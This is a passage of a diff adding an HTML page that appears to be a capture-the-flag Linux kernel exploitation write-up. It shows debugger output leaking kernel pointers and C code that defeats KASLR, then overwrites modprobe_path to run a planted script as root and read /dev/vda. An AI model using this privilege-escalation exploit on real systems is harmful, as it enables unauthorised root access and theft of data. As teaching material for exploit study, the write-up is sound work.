+<text text-anchor='middle' x='152' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='152' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='160' y='4' fill='currentColor' style='font-size:1em'>┬</text>
+<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>┼</text>
+<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>┴</text>
+<text text-anchor='middle' x='168' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='176' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='184' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='192' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>+</text>
+<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='200' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='208' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='216' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='224' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>4</text>
+<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='232' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='240' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>_</text>
+<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='248' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>b</text>
+<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='256' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='264' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='264' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='272' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='272' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='272' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='280' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='280' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='280' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='288' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='288' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='288' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='296' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='296' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='304' y='4' fill='currentColor' style='font-size:1em'>┬</text>
+<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='304' y='36' fill='currentColor' style='font-size:1em'>┼</text>
+<text text-anchor='middle' x='304' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='304' y='68' fill='currentColor' style='font-size:1em'>┴</text>
+<text text-anchor='middle' x='312' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='312' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='312' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='320' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='320' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='320' y='52' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='320' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='328' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='328' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='328' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='336' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>y</text>
+<text text-anchor='middle' x='336' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='336' y='52' fill='currentColor' style='font-size:1em'>+</text>
+<text text-anchor='middle' x='336' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='344' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>_</text>
+<text text-anchor='middle' x='344' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='344' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='352' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='352' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='352' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='352' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='360' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='360' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='360' y='52' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='360' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='368' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='368' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='368' y='52' fill='currentColor' style='font-size:1em'>8</text>
+<text text-anchor='middle' x='368' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='376' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='376' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='376' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='376' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='384' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='384' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='384' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='384' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='392' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='392' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='392' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='400' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='400' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='400' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='408' y='4' fill='currentColor' style='font-size:1em'>┐</text>
+<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='408' y='36' fill='currentColor' style='font-size:1em'>┤</text>
+<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='408' y='68' fill='currentColor' style='font-size:1em'>┘</text>
+</g>
+
+    </svg>
+  
+</div>
+<p>We&rsquo;ll verify our understanding of the system by debugging it with gdb again.
+When we run those commands below, <code>rbx</code> is holding the value of a address of a
+<code>checksum_buffer</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p/x $rbx
+</span></span><span style="display:flex;"><span>$2 <span style="color:#f92672">=</span> 0xff11000004962400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; telescope 0xff11000004962400+0x400
+</span></span><span style="display:flex;"><span>00:0000│  0xff11000004962800 ◂— 0x7e00000001
+</span></span><span style="display:flex;"><span>01:0008│  0xff11000004962808 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>02:0010│  0xff11000004962810 —▸ 0xff1100000414b240 ◂— 0x101
+</span></span><span style="display:flex;"><span>03:0018│  0xff11000004962818 —▸ 0xff110000048edc00 —▸ 0xff110000048edc50 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>04:0020│  0xff11000004962820 —▸ 0xffffffff82289480 <span style="color:#f92672">(</span>ptm_unix98_ops<span style="color:#f92672">)</span> —▸ 0xffffffff8163dfa0 <span style="color:#f92672">(</span>ptm_unix98_lookup<span style="color:#f92672">)</span> ◂— endbr64
+</span></span><span style="display:flex;"><span>05:0028│  0xff11000004962828 —▸ 0xff1100000459b050 —▸ 0xffffffff82bd14a0 <span style="color:#f92672">(</span>n_tty_ops<span style="color:#f92672">)</span> —▸ 0xffffffff82722080 <span style="color:#f92672">(</span>.LC3+121<span style="color:#f92672">)</span> ◂— 0x7264007974745f6e /* <span style="color:#e6db74">&#39;n_tty&#39;</span> */
+</span></span><span style="display:flex;"><span>06:0030│  0xff11000004962830 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>07:0038│  0xff11000004962838 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; telescope 0xff11000004962400+0x400*3
+</span></span><span style="display:flex;"><span>00:0000│  0xff11000004963000 ◂— 0x7e00000001
+</span></span><span style="display:flex;"><span>01:0008│  0xff11000004963008 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>02:0010│  0xff11000004963010 —▸ 0xff1100000414b840 ◂— 0x101
+</span></span><span style="display:flex;"><span>03:0018│  0xff11000004963018 —▸ 0xff110000048ed400 —▸ 0xff110000048ed450 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>04:0020│  0xff11000004963020 —▸ 0xffffffff82289360 <span style="color:#f92672">(</span>pty_unix98_ops<span style="color:#f92672">)</span> —▸ 0xffffffff8163e4c0 <span style="color:#f92672">(</span>pts_unix98_lookup<span style="color:#f92672">)</span> ◂— endbr64
+</span></span><span style="display:flex;"><span>05:0028│  0xff11000004963028 —▸ 0xff1100000459b5f0 —▸ 0xffffffff82bd14a0 <span style="color:#f92672">(</span>n_tty_ops<span style="color:#f92672">)</span> —▸ 0xffffffff82722080 <span style="color:#f92672">(</span>.LC3+121<span style="color:#f92672">)</span> ◂— 0x7264007974745f6e /* <span style="color:#e6db74">&#39;n_tty&#39;</span> */
+</span></span><span style="display:flex;"><span>06:0030│  0xff11000004963030 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>07:0038│  0xff11000004963038 ◂— <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Note the values at the offsets <code>0x20</code>:  <code>0xffffffff82289480</code> and <code>0xffffffff82289360</code>. These are high memory addresses that point to global variables on the kernel, we can use them to break <code>KASLR</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> kbase_leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_read</span>(fd, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>)); <span style="color:#75715e">// next kmalloc-1024 slot
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (kbase_leak <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xffffffff81000000</span>) <span style="color:#66d9ef">continue</span>;  <span style="color:#75715e">// verify that we have a high-address pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;(~) kbase_leak %016lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kbase_leak);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//ref: https://elixir.bootlin.com/linux/v6.10.10/source/drivers/tty/pty.c#L745
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint64_t</span> ptm_unix98_ops_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff82289360</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xffffffff81000000</span>;
+</span></span><span style="display:flex;"><span>    kbase <span style="color:#f92672">=</span> (kbase_leak <span style="color:#f92672">-</span> ptm_unix98_ops_offset) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffff0000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="arb-write--kaslr-leak--privesc">Arb write + KASLR leak = PRIVESC</h1>
+<p>Now that we have those primitives, it&rsquo;s just a matter of rewriting the
+<code>modprobe_path</code> variable (<em>see [1]</em>) and executing a malformed binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> modprobe_path_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff82b3f100</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xffffffff81000000</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;(!) modprobe_path: %016lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kbase <span style="color:#f92672">+</span> modprobe_path_offset);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_global</span>(fd, kbase <span style="color:#f92672">+</span> modprobe_path_offset, (<span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span>)<span style="color:#e6db74">&#34;/tmp/p&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -ne &#39;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">cat /dev/vda &gt; /tmp/flag&#39; &gt; /tmp/p&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod a+x /tmp/p&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -ne &#39;</span><span style="color:#ae81ff">\xff\xff\xff\xff</span><span style="color:#e6db74">&#39; &gt; /tmp/executeme&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod a+x /tmp/executeme&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;(!) Modprobe Setup done :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/tmp/executeme&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> flag_buf[<span style="color:#ae81ff">0x200</span>];
+</span></span><span style="display:flex;"><span>FILE<span style="color:#f92672">*</span> flag <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/tmp/flag&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fscanf</span>(flag, <span style="color:#e6db74">&#34;%s&#34;</span>, flag_buf);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;(~) FLAG: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag_buf);
+</span></span></code></pre></div><h1 id="references">References</h1>
 <ul>
 <li>[1] - <a href="https://pawnyable.cafe/linux-kernel/">https://pawnyable.cafe/linux-kernel/</a></li>
 <li>[2] - <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</a></li>
